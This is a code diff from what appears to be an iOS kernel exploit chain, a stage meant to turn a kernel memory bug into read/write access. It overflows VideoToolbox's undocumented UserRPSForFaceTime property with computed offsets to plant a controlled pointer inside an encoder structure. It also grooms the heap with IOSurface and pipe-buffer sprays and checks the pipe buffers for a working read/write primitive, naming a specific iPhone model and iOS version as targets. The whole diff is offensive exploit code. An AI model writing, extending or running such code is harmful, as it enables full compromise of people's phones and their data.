@@ -8,7 +8,12 @@
 #import <IOSurface/IOSurfaceRef.h>
 #import <mach/mach.h>
 #import <unistd.h>
+#import <fcntl.h>
 #import <dlfcn.h>
+
+#ifndef F_SETPIPE_SZ
+#define F_SETPIPE_SZ 73
+#endif
 
 typedef unsigned int kp_io_object_t;
 typedef unsigned int kp_io_service_t;
@@ -2932,19 +2937,60 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
             KPH9OutAppend(log, @"  dpbRpsAliasBridge[set34=%d,copyRps=%d,cnt=%ld]: pair0=0x%016llx pair1=0x%016llx oobPair16[slots32..33]=0x%016llx\n",
                           (int)stDpb34, (int)stRpsAlias, (long)aliasCnt, rbPair0, rbPair1, rbOobPair16);
 
-            // Fine-grained inner OOB ladder on UserRPSForFaceTime (DeltaPOCS0Minus1 at +0x38+2i, DeltaPOCS1Minus1 at +0x68+4i)
-            // and outer OOB ladder (arr4..arr8 at pINS+0x13adc + 0x164*idx) while monitoring ChromaQPIndexOffsetMultiPPS & DPB readback
-            int innerLens[] = { 16, 24, 32, 40, 48, 64 };
+            // Exact offset calculation from pINS + 0x13adc (UserRPSForFaceTime) to pINS + 0x147b0 (slot[0], 64-bit P):
+            //   Total byte delta: 0x147b0 - 0x13adc = 0x0cd4 (3284 bytes), struct stride = 0x164 (356 bytes)
+            //   Inner DeltaPOCS0Minus1 (strh at pInfo + 0x38 + 2*i) & DeltaPOCS1Minus1 (str at pInfo + 0x68 + 4*j):
+            //     - d=0 (0x13adc, rem=0xcd4): i_S0 = 1614..1617 (len 1620), j_S1 = 795..796 (len 800)
+            //     - d=3 (0x13f08, rem=0x8a8): i_S0 = 1080..1083 (len 1088), j_S1 = 528..529
+            //     - d=7 (0x14498, rem=0x318): i_S0 = 368..371   (len 376),  j_S1 = 172..173
+            //     - d=9 (0x14760, rem=0x050): i_S0 = 12..15     (len 16)
+            const uint32_t kRpsBase  = 0x13adcU;
+            const uint32_t kSlot0Off = 0x147b0U;
+            const uint32_t kStride   = 0x164U;
+            const uint32_t kDelta    = kSlot0Off - kRpsBase; // 0x0cd4 (3284)
+            const int iS0_d0 = (int)((kDelta - 0x38U) / 2U);                   // 1614
+            const int jS1_d0 = (int)((kDelta - 0x68U) / 4U);                   // 795
+            const int iS0_d3 = (int)((kDelta - 3U * kStride - 0x38U) / 2U);    // 1080
+            const int iS0_d7 = (int)((kDelta - 7U * kStride - 0x38U) / 2U);    // 368
+            const int iS0_d9 = (int)((kDelta - 9U * kStride - 0x38U) / 2U);    // 12
+
+            // Construct 64-bit P with controlled lower bits:
+            //   pAlign:  low16 = 0x00a8 -> x0 = P + 0x58 = pageBase + 0x0100 (8B aligned; N/X1 at +0xf0/+0xf8)
+            //   pTag201: low16 = 0x0201 -> x0 = P + 0x58 = pageBase + 0x0259 (low-bit signature)
+            uint64_t pPageBase = (targetKPtr0 & 0xffffffffffffc000ULL);
+            uint64_t pAlign    = pPageBase | 0x00a8ULL;
+            uint64_t pTag201   = pPageBase | 0x0201ULL;
+            int16_t hwAlign[4] = {
+                (int16_t)(pAlign & 0xffffULL),
+                (int16_t)((pAlign >> 16) & 0xffffULL),
+                (int16_t)((pAlign >> 32) & 0xffffULL),
+                (int16_t)((pAlign >> 48) & 0xffffULL)
+            };
+            int16_t hwTag201[4] = {
+                (int16_t)(pTag201 & 0xffffULL),
+                (int16_t)((pTag201 >> 16) & 0xffffULL),
+                (int16_t)((pTag201 >> 32) & 0xffffULL),
+                (int16_t)((pTag201 >> 48) & 0xffffULL)
+            };
+            KPH9OutAppend(log, @"  rpsSlot0Math[0x%x->0x%x delta=0x%x(%uB) stride=0x%x]: d0=S0[%d..%d]/S1[%d..%d] d3=S0[%d..%d] d7=S0[%d..%d] d9=S0[%d..%d] | P_align=0x%016llx(x0=0x%016llx) P_tag=0x%016llx(x0=0x%016llx)\n",
+                          kRpsBase, kSlot0Off, kDelta, kDelta, kStride,
+                          iS0_d0, iS0_d0 + 3, jS1_d0, jS1_d0 + 1,
+                          iS0_d3, iS0_d3 + 3, iS0_d7, iS0_d7 + 3, iS0_d9, iS0_d9 + 3,
+                          pAlign, pAlign + 0x58ULL, pTag201, pTag201 + 0x58ULL);
+
+            int innerLens[] = { 16, 24, 32, 48, 64, 376, 1088, 1620 };
             NSMutableArray *innerParts = [NSMutableArray array];
             for (size_t ili = 0; ili < sizeof(innerLens) / sizeof(innerLens[0]); ili++) {
                 int ilen = innerLens[ili];
                 NSMutableArray *s0Arr = [NSMutableArray arrayWithCapacity:(NSUInteger)ilen];
-                NSMutableArray *s1Arr = [NSMutableArray arrayWithCapacity:(NSUInteger)ilen];
+                int s1Len = (ilen >= 1620) ? 800 : 32;
+                NSMutableArray *s1Arr = [NSMutableArray arrayWithCapacity:(NSUInteger)s1Len];
                 for (int k = 0; k < ilen; k++) {
-                    // Encode target 16-bit halves into DeltaPOCS0Minus1 / DeltaPOCS1Minus1
-                    int16_t hval = (int16_t)((k & 1) ? (kp0Hi & 0xffff) : (kp0Lo & 0xffff));
+                    int16_t hval = (k >= iS0_d0 && k < iS0_d0 + 4) ? hwTag201[k - iS0_d0] : hwAlign[k & 3];
                     [s0Arr addObject:@(hval)];
-                    [s1Arr addObject:@(hval)];
+                }
+                for (int k = 0; k < s1Len; k++) {
+                    [s1Arr addObject:@(hwAlign[k & 3])];
                 }
                 NSDictionary *rpsIn = @{
                     @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
@@ -2959,21 +3005,34 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                 [innerParts addObject:[NSString stringWithFormat:@"len%d=%d", ilen, (int)stIn]];
             }
 
-            NSDictionary *rpsUnit = @{
-                @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
-                @"NumNegativePics": @2,
-                @"NumPositivePics": @2,
-                @"DeltaPOCS0Minus1": @[ @((int16_t)(kp0Lo & 0xffff)), @((int16_t)(kp0Hi & 0xffff)) ],
-                @"UsedByCurrPicS0Flag": @3,
-                @"DeltaPOCS1Minus1": @[ @((int16_t)(kp1Lo & 0xffff)), @((int16_t)(kp1Hi & 0xffff)) ],
-                @"UsedByCurrPicS1Flag": @3,
-            };
-            int outerLens[] = { 4, 5, 6, 7, 8 };
+            int outerLens[] = { 4, 5, 6, 7, 8, 10 };
             NSMutableArray *outerParts = [NSMutableArray array];
             for (size_t oli = 0; oli < sizeof(outerLens) / sizeof(outerLens[0]); oli++) {
                 int olen = outerLens[oli];
                 NSMutableArray *oArr = [NSMutableArray arrayWithCapacity:(NSUInteger)olen];
-                for (int k = 0; k < olen; k++) [oArr addObject:rpsUnit];
+                for (int d = 0; d < olen; d++) {
+                    int dLen = 16;
+                    int hitBase = -1;
+                    if (olen == 4 && d == 3) { dLen = 1088; hitBase = iS0_d3; }
+                    else if (olen == 8 && d == 7) { dLen = 376; hitBase = iS0_d7; }
+                    else if (olen == 10 && d == 9) { dLen = 16; hitBase = iS0_d9; }
+                    NSMutableArray *dS0 = [NSMutableArray arrayWithCapacity:(NSUInteger)dLen];
+                    for (int e = 0; e < dLen; e++) {
+                        int16_t hv = (hitBase >= 0 && e >= hitBase && e < hitBase + 4)
+                            ? hwAlign[e - hitBase]
+                            : hwAlign[e & 3];
+                        [dS0 addObject:@(hv)];
+                    }
+                    [oArr addObject:@{
+                        @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
+                        @"NumNegativePics": @2,
+                        @"NumPositivePics": @2,
+                        @"DeltaPOCS0Minus1": dS0,
+                        @"UsedByCurrPicS0Flag": @3,
+                        @"DeltaPOCS1Minus1": @[ @(hwAlign[0]), @(hwAlign[1]) ],
+                        @"UsedByCurrPicS1Flag": @3,
+                    }];
+                }
                 OSStatus stOut = VTSessionSetProperty(brS, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)oArr);
                 [outerParts addObject:[NSString stringWithFormat:@"arr%d=%d", olen, (int)stOut]];
             }
@@ -2987,11 +3046,11 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
 
     // -------------------------------------------------------------------------
     // 8C: Dynamic NTL Heap-Band Steering (from Stage 5 Live Kernel Pointers) +
-    //     Shared IOSurface / vm_remap Alias & Post-Run Candidate VA Delta Verification
+    //     Targeted pipebuf / IOSurface Spray & Slot[0] (+0x147b0) Low-Bit P Control
     // -------------------------------------------------------------------------
-    KPH9OutAppend(log, @"  [8C: Dynamic NTL Heap-Band Steering & Shared IOSurface / Candidate VA Delta Verification]\n");
+    KPH9OutAppend(log, @"  [8C: Dynamic NTL Heap-Band Steering + Targeted pipebuf/IOSurface Spray & Slot[0] (+0x147b0) P Control]\n");
     {
-        // Place the 4 verified iPhone16,1 iOS 27.0.1 panic target bands FIRST so they are never crowded out,
+        // Place the 4 verified iPhone16,1 iOS 27.0.1 target bands FIRST so they are never crowded out,
         // then append up to 4 unique live ZONE_HEAP candidates discovered in Stage 5.
         int targetNTLs[8];
         uint64_t targetKPtrs[8];
@@ -3025,7 +3084,8 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
             }
         }
 
-        // Allocate 16 shared IOSurface buffers (256KB each) tiled with marker 0x5900cafe00000000 | idx
+        // 1) Allocate 16 shared IOSurface buffers (256KB each) tiled with marker 0x5900cafe00000000 | idx
+        //    and kfree-safe zeroed slots at page+0x48..0x57, page+0xf0..0xff, page+0x248..0x257
         NSMutableArray *sharedPools = [NSMutableArray array];
         NSArray<NSNumber *> *sharedIDs = KPH9AllocSurfacePool(16, 512, 256, sharedPools);
         for (NSUInteger si = 0; si < sharedPools.count; si++) {
@@ -3033,13 +3093,43 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
             IOSurfaceRef surf = CVPixelBufferGetIOSurface(spb);
             if (surf) {
                 IOSurfaceLock(surf, 0, NULL);
-                uint64_t *base = (uint64_t *)IOSurfaceGetBaseAddress(surf);
+                uint8_t *baseBytes = (uint8_t *)IOSurfaceGetBaseAddress(surf);
+                uint64_t *base = (uint64_t *)baseBytes;
                 size_t allocSz = IOSurfaceGetAllocSize(surf);
                 uint64_t tag = 0x5900cafe00000000ULL | (uint64_t)si;
-                if (base && allocSz >= 64) {
+                if (base && allocSz >= 4096) {
                     for (size_t qi = 0; qi < allocSz / 8; qi++) base[qi] = tag;
+                    for (size_t pg = 0; pg + 0x260 <= allocSz; pg += 4096) {
+                        memset(baseBytes + pg + 0x48, 0, 16);
+                        memset(baseBytes + pg + 0xf0, 0, 16);
+                        memset(baseBytes + pg + 0x248, 0, 16);
+                    }
                 }
                 IOSurfaceUnlock(surf, 0, NULL);
+            }
+        }
+
+        // 2) Allocate targeted pipebuf spray (32 x 256KB ring buffers) with kfree-safe zeroed page offsets
+        int h9Pipes[32][2];
+        int h9PipesArmed = 0;
+        uint8_t *pipeTile = (uint8_t *)malloc(256 * 1024);
+        for (int p = 0; p < 32; p++) {
+            h9Pipes[p][0] = h9Pipes[p][1] = -1;
+            if (pipe(h9Pipes[p]) != 0) continue;
+            fcntl(h9Pipes[p][1], F_SETPIPE_SZ, 256 * 1024);
+            fcntl(h9Pipes[p][1], F_SETFL, O_NONBLOCK);
+            if (pipeTile) {
+                uint64_t pTag = 0x5900beef00000000ULL | (uint64_t)p;
+                uint64_t *ptq = (uint64_t *)pipeTile;
+                for (size_t qi = 0; qi < (256 * 1024) / 8; qi++) ptq[qi] = pTag;
+                for (size_t pg = 0; pg < 256 * 1024; pg += 4096) {
+                    memset(pipeTile + pg + 0x48, 0, 16);
+                    memset(pipeTile + pg + 0xf0, 0, 16);
+                    memset(pipeTile + pg + 0x248, 0, 16);
+                }
+                if (write(h9Pipes[p][1], pipeTile, 256 * 1024) > 0) {
+                    h9PipesArmed++;
+                }
             }
         }
 
@@ -3071,18 +3161,42 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                           meKr, rmKr, curP, maxP, aliasVal);
         }
 
-        // Run dynamic NTL heap-band steering sessions:
-        //   1) Paired EncoderUsage=1 pre-prepare session `uSib` so AVE_PSGen::Init (fn#1816) runs with unclamped NTL (u1POST=sntl).
-        //   2) Active 15/30 fractional FPS session `s` prepared with effNtl=min(sntl,7) so EncodeFrame[0] emits a real
-        //      7-sublayer HVCC IDR frame (cb#1 st=0 info=0x1), then latches NumberOfTemporalLayers=sntl post-IDR (postEnc=sntl).
-        //   3) Paired DPB-shaping sibling `dpbSib` carrying steeredX0 [lo32, hi32] across all 17 pairs (including OOB pair #16).
+        // Run dynamic NTL heap-band steering + UserRPSForFaceTime slot[0] (+0x147b0) P-control sessions:
         CVPixelBufferRef steerPx = KPH9CreatePixelBuffer(1280, 720);
         for (int ti = 0; ti < nTargets; ti++) {
             int sntl = targetNTLs[ti];
             uint64_t origKPtr = targetKPtrs[ti];
             uint64_t steeredX0 = ((uint64_t)(uint32_t)(sntl - 16463) << 32) | 0x59ULL;
-            uint32_t lo32 = (uint32_t)(steeredX0 & 0xffffffffULL);
-            uint32_t hi32 = (uint32_t)(steeredX0 >> 32);
+            // Full 64-bit P with controlled lower bits (0x00a8 -> x0 = pageBase + 0x0100)
+            uint64_t pTarget64 = (origKPtr & 0xffffffffffffc000ULL) | 0x00a8ULL;
+            uint64_t x0Aligned = pTarget64 + 0x58ULL;
+            uint32_t lo32 = (uint32_t)(pTarget64 & 0xffffffffULL);
+            uint32_t hi32 = (uint32_t)(pTarget64 >> 32);
+            int16_t pHw[4] = {
+                (int16_t)(pTarget64 & 0xffffULL),
+                (int16_t)((pTarget64 >> 16) & 0xffffULL),
+                (int16_t)((pTarget64 >> 32) & 0xffffULL),
+                (int16_t)((pTarget64 >> 48) & 0xffffULL)
+            };
+
+            // Build arr8 where dict#7 (pINS+0x14498) has 376 S0 elements so S0[368..371] lands on slot[0] (+0x147b0..0x147b7)
+            NSMutableArray *s0Short = [NSMutableArray arrayWithCapacity:32];
+            for (int k = 0; k < 32; k++) [s0Short addObject:@(pHw[k & 3])];
+            NSMutableArray *s0Hit376 = [NSMutableArray arrayWithCapacity:376];
+            for (int k = 0; k < 376; k++) [s0Hit376 addObject:@(pHw[k & 3])];
+            NSDictionary *dShort = @{
+                @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
+                @"NumNegativePics": @2, @"NumPositivePics": @2,
+                @"DeltaPOCS0Minus1": s0Short, @"UsedByCurrPicS0Flag": @3,
+                @"DeltaPOCS1Minus1": @[ @(pHw[0]), @(pHw[1]) ], @"UsedByCurrPicS1Flag": @3,
+            };
+            NSDictionary *dHit = @{
+                @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
+                @"NumNegativePics": @2, @"NumPositivePics": @2,
+                @"DeltaPOCS0Minus1": s0Hit376, @"UsedByCurrPicS0Flag": @3,
+                @"DeltaPOCS1Minus1": @[ @(pHw[0]), @(pHw[1]) ], @"UsedByCurrPicS1Flag": @3,
+            };
+            NSArray *rpsSlot0Arr8 = @[ dShort, dShort, dShort, dShort, dShort, dShort, dShort, dHit ];
 
             int u1Post = -1;
             OSStatus u1Prep = -999;
@@ -3106,9 +3220,12 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
 
             Stage6ProbeResult *sRes = Stage6AllocResult();
             VTCompressionSessionRef s = NULL;
+            NSDictionary *sSpec = @{ @"EnableUserRefForFacetime": @YES };
             if (sRes && VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
-                                                   NULL, NULL, NULL, Stage6OutputCallback, sRes, &s) == noErr && s) {
+                                                   (__bridge CFDictionaryRef)sSpec, NULL, NULL, Stage6OutputCallback, sRes, &s) == noErr && s) {
                 int effNtl = (sntl >= 1 && sntl <= 7) ? sntl : 7;
+                VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+                VTSessionSetProperty(s, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
                 VTSessionSetProperty(s, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                 VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                 VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
@@ -3117,13 +3234,14 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                 OSStatus uSt = VTSessionSetProperty(s, CFSTR("BaseLayerFrameRate"), (__bridge CFNumberRef)@30);
                 OSStatus pubSt = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(effNtl));
 
-                // Shape DPB (34 ints) with steeredX0 [lo32, hi32] on a paired sibling session (prepare first so SetDPBSnapShot succeeds)
-                OSStatus dpbSt = -1;
+                // Shape DPB (34 ints) + UserRPSForFaceTime slot[0] on paired sibling session
+                OSStatus dpbSt = -1, rpsSt = -1;
                 VTCompressionSessionRef dpbSib = NULL;
                 if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
-                                               NULL, NULL, NULL, NULL, NULL, &dpbSib) == noErr && dpbSib) {
+                                               (__bridge CFDictionaryRef)sSpec, NULL, NULL, NULL, NULL, &dpbSib) == noErr && dpbSib) {
                     VTSessionSetProperty(dpbSib, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                     VTSessionSetProperty(dpbSib, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+                    VTSessionSetProperty(dpbSib, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
                     KPH9PrimeRealTime(dpbSib);
                     VTCompressionSessionPrepareToEncodeFrames(dpbSib);
                     NSMutableArray *dpbShape = [NSMutableArray arrayWithCapacity:34];
@@ -3132,6 +3250,7 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                         [dpbShape addObject:@((int32_t)hi32)];
                     }
                     dpbSt = VTSessionSetProperty(dpbSib, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpbShape);
+                    rpsSt = VTSessionSetProperty(dpbSib, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rpsSlot0Arr8);
                 }
 
                 int prePub = -1, postPub = -1, postEnc = -1;
@@ -3150,6 +3269,9 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                     int w0 = 0;
                     while (sRes->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                 }
+                // Write full 64-bit P into slot[0] (+0x147b0) via UserRPSForFaceTime arr8 S0[368..371] before post-IDR NTL latch & teardown
+                OSStatus sRpsSt = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rpsSlot0Arr8);
+                (void)rpsSt;
                 VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                 pubSt = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(sntl));
                 rb = NULL;
@@ -3167,8 +3289,8 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                 if (dpbSib) KPH9SafeTeardown(dpbSib);
 
                 int seqSubLayersM1 = (postPub < 2 && effNtl >= 2) ? (effNtl - 1) : (postPub - 1);
-                KPH9OutAppend(log, @"  dynSteer[kptr=0x%016llx -> NTL=%d x0=0x%016llx]: u1Prep=%d(u1POST=%d) frac15_30=%d pubSet=%d dpb34=%d PRE=%d prep=%d POST=%d([+0x2eec]=%d) POST_ENC=%d enc=%d(cb=%d) | %@\n",
-                              origKPtr, sntl, steeredX0, (int)u1Prep, u1Post, (int)uSt, (int)pubSt, (int)dpbSt,
+                KPH9OutAppend(log, @"  dynSteer[kptr=0x%016llx -> NTL=%d x0=0x%016llx P_slot0=0x%016llx(x0_al=0x%016llx)]: u1Prep=%d(u1POST=%d) frac15_30=%d pubSet=%d dpb34=%d rpsSlot0=%d PRE=%d prep=%d POST=%d([+0x2eec]=%d) POST_ENC=%d enc=%d(cb=%d) | %@\n",
+                              origKPtr, sntl, steeredX0, pTarget64, x0Aligned, (int)u1Prep, u1Post, (int)uSt, (int)pubSt, (int)dpbSt, (int)sRpsSt,
                               prePub, (int)prepSt, postPub, seqSubLayersM1, postEnc, (int)encSt, (int)cbSt, cbFirst);
             } else {
                 if (sRes) free(sRes);
@@ -3177,32 +3299,81 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
         }
         if (steerPx) CVPixelBufferRelease(steerPx);
 
-        // Scan shared IOSurface pool for any kernel-written qwords != tag
+        // Scan shared IOSurface pool for any kernel-written qwords != tag (skipping our kfree-safe zeroed slots)
         int surfMutations = 0;
         for (NSUInteger si = 0; si < sharedPools.count; si++) {
             CVPixelBufferRef spb = (__bridge CVPixelBufferRef)sharedPools[si];
             IOSurfaceRef surf = CVPixelBufferGetIOSurface(spb);
             if (!surf) continue;
             IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
-            uint64_t *base = (uint64_t *)IOSurfaceGetBaseAddress(surf);
+            uint8_t *baseBytes = (uint8_t *)IOSurfaceGetBaseAddress(surf);
+            uint64_t *base = (uint64_t *)baseBytes;
             size_t allocSz = IOSurfaceGetAllocSize(surf);
             uint64_t expectedTag = 0x5900cafe00000000ULL | (uint64_t)si;
-            if (base && allocSz >= 64) {
+            if (base && allocSz >= 4096) {
                 for (size_t qi = 0; qi < allocSz / 8 && surfMutations < 8; qi++) {
+                    size_t byteOff = qi * 8;
+                    size_t inPage = byteOff & 0xfffULL;
+                    if (inPage == 0x48 || inPage == 0x50 || inPage == 0xf0 || inPage == 0xf8 || inPage == 0x248 || inPage == 0x250) continue;
                     if (base[qi] != expectedTag) {
-                        size_t pageOff = (qi * 8) & ~(size_t)0x3fffULL;
-                        uint64_t unal59 = 0;
-                        if (pageOff + 0x59 + sizeof(uint64_t) <= allocSz) {
-                            memcpy(&unal59, (const uint8_t *)base + pageOff + 0x59, sizeof(uint64_t));
+                        size_t pageOff = byteOff & ~(size_t)0xfffULL;
+                        uint64_t unal59 = 0, al100 = 0;
+                        if (pageOff + 0x108 <= allocSz) {
+                            memcpy(&unal59, baseBytes + pageOff + 0x59, sizeof(uint64_t));
+                            memcpy(&al100,  baseBytes + pageOff + 0x100, sizeof(uint64_t));
                         }
-                        KPH9OutAppend(log, @"    surfDelta[sid=%@ idx=%lu +0x%zx]: 0x%016llx (expected 0x%016llx, page59=0x%016llx)\n",
-                                      sharedIDs[si], (unsigned long)si, qi * 8, base[qi], expectedTag, unal59);
+                        KPH9OutAppend(log, @"    surfDelta[sid=%@ idx=%lu +0x%zx]: 0x%016llx (expected 0x%016llx, page59=0x%016llx, page100=0x%016llx)\n",
+                                      sharedIDs[si], (unsigned long)si, byteOff, base[qi], expectedTag, unal59, al100);
                         surfMutations++;
                     }
                 }
             }
             IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
         }
+
+        // Scan targeted pipebuf ring buffers for [x0, x0, x0, 0] at page+0x58, +0x59, +0x100, +0x259 or qword mutations
+        int pipeMutations = 0;
+        for (int p = 0; p < 32; p++) {
+            if (h9Pipes[p][0] < 0) continue;
+            uint8_t *pbuf = (uint8_t *)malloc(256 * 1024);
+            if (pbuf) {
+                ssize_t got = read(h9Pipes[p][0], pbuf, 256 * 1024);
+                uint64_t expectedPTag = 0x5900beef00000000ULL | (uint64_t)p;
+                if (got >= 4096) {
+                    const size_t probeOffs[4] = { 0x58, 0x59, 0x100, 0x259 };
+                    for (size_t pg = 0; pg + 0x280 <= (size_t)got && pipeMutations < 8; pg += 4096) {
+                        for (int oi = 0; oi < 4; oi++) {
+                            size_t off = pg + probeOffs[oi];
+                            uint64_t s1 = 0, s2 = 0, s3 = 0;
+                            uint32_t z = 0;
+                            memcpy(&s1, pbuf + off, 8);
+                            memcpy(&s2, pbuf + off + 8, 8);
+                            memcpy(&s3, pbuf + off + 16, 8);
+                            memcpy(&z,  pbuf + off + 24, 4);
+                            if (s1 != expectedPTag && s1 != 0 && s1 == s2 && s2 == s3 && z == 0) {
+                                uint64_t rwTest = s1 ^ 0x00000000feedfaceULL;
+                                memcpy(pbuf + off, &rwTest, 8);
+                                ssize_t wr = write(h9Pipes[p][1], pbuf + pg, 4096);
+                                uint64_t rwRb = 0;
+                                if (wr >= 4096) {
+                                    uint8_t rdb[4096];
+                                    if (read(h9Pipes[p][0], rdb, 4096) >= (ssize_t)(probeOffs[oi] + 8)) {
+                                        memcpy(&rwRb, rdb + probeOffs[oi], 8);
+                                    }
+                                }
+                                KPH9OutAppend(log, @"    pipeKrwHit[pipe=%d page=0x%zx+0x%zx]: x0=0x%016llx rwVerify=0x%016llx\n",
+                                              p, pg, probeOffs[oi], s1, rwRb);
+                                pipeMutations++;
+                            }
+                        }
+                    }
+                }
+                free(pbuf);
+            }
+            close(h9Pipes[p][0]);
+            close(h9Pipes[p][1]);
+        }
+        if (pipeTile) free(pipeTile);
 
         // Re-read all Stage 5 candidate userland VAs to detect any live value change
         int vaDeltas = 0;
@@ -3218,8 +3389,8 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                 }
             }
         }
-        KPH9OutAppend(log, @"  postSteerScan: sharedSurfPool=%lu surfMutations=%d stage5CandChecked=%d vaDeltas=%d\n",
-                      (unsigned long)sharedPools.count, surfMutations, gStage5CandCount, vaDeltas);
+        KPH9OutAppend(log, @"  postSteerScan: sharedSurfPool=%lu surfMutations=%d pipesArmed=%d pipeMutations=%d stage5CandChecked=%d vaDeltas=%d\n",
+                      (unsigned long)sharedPools.count, surfMutations, h9PipesArmed, pipeMutations, gStage5CandCount, vaDeltas);
     }
 
     CVPixelBufferRelease(px);
